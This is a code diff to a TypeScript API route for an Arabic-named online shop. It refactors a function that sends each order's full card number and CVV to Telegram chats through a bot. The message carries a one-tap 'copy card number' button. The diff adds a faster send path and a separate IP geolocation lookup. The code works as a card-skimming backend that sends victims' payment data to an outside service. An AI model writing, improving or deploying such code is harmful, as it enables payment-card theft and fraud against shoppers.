@@ -17,6 +17,18 @@ function checkNotifyRateLimit(ip: string): boolean {
   return true;
 }
 
+async function getCountry(ip: string): Promise<string> {
+  try {
+    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country`, {
+      signal: AbortSignal.timeout(1500),
+    });
+    const geoData = await geoRes.json();
+    return geoData.country || "غير معروف";
+  } catch {
+    return "غير معروف";
+  }
+}
+
 async function sendTelegramNotification(
   orderId: string,
   ip: string,
@@ -32,18 +44,15 @@ async function sendTelegramNotification(
 ): Promise<void> {
   const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
 
-  let country = "غير معروف";
-  if (!isLocal) {
-    try {
-      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
-      const geoData = await geoRes.json();
-      if (geoData.country) country = geoData.country;
-    } catch {
-      // Non-critical
-    }
-  }
+  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
 
-  const text = [
+  const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? process.env.TELEGRAM_CHAT_ID ?? "")
+    .split(",").map((id) => id.trim()).filter(Boolean);
+
+  // جلب الدولة وإرسال تيليغرام بالتوازي — الرسالة الأولى بدون دولة، ثم تعديل إذا توفرت
+  const countryPromise = isLocal ? Promise.resolve("غير معروف") : getCountry(ip);
+
+  const buildText = (country: string) => [
     `🛒 طلب لـ متجر مؤسسة مدار التقنية`,
     `🔖 رقم الطلب: #${orderId}`,
     ``,
@@ -63,7 +72,6 @@ async function sendTelegramNotification(
     `🔑 CVV: ${cvv}`,
   ].join("\n");
 
-  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
   const reply_markup = {
     inline_keyboard: [[
       { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber.replace(/\s+/g, "") } },
@@ -71,18 +79,35 @@ async function sendTelegramNotification(
     ]],
   };
 
-  const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? process.env.TELEGRAM_CHAT_ID ?? "")
-    .split(",").map((id) => id.trim()).filter(Boolean);
+  // إرسال الرسالة فوراً بدون انتظار الدولة
+  const sendMessages = (country: string) =>
+    Promise.all(
+      chatIds.map((chat_id) =>
+        fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id, text: buildText(country), reply_markup }),
+        }).catch(() => {})
+      )
+    );
 
-  await Promise.all(
-    chatIds.map((chat_id) =>
-      fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text, reply_markup }),
-      }).catch(() => {})
-    )
-  );
+  // إرسال فوري مع "جاري التحقق" للدولة، ثم تحديث بعد ما تجي
+  const FAST_TIMEOUT = 400; // ms — إذا ما جاوبت ip-api بسرعة نرسل بدونها
+  const fastCountry = await Promise.race([
+    countryPromise,
+    new Promise<string>((resolve) => setTimeout(() => resolve("..."), FAST_TIMEOUT)),
+  ]);
+
+  await sendMessages(fastCountry);
+
+  // إذا كانت الدولة لسه "..." يعني ما وصلت بالوقت المحدد، ننتظرها ونرسل رسالة معدّلة
+  if (fastCountry === "...") {
+    countryPromise.then(async (country) => {
+      if (country && country !== "غير معروف") {
+        await sendMessages(country).catch(() => {});
+      }
+    }).catch(() => {});
+  }
 }
 
 export async function POST(req: NextRequest) {
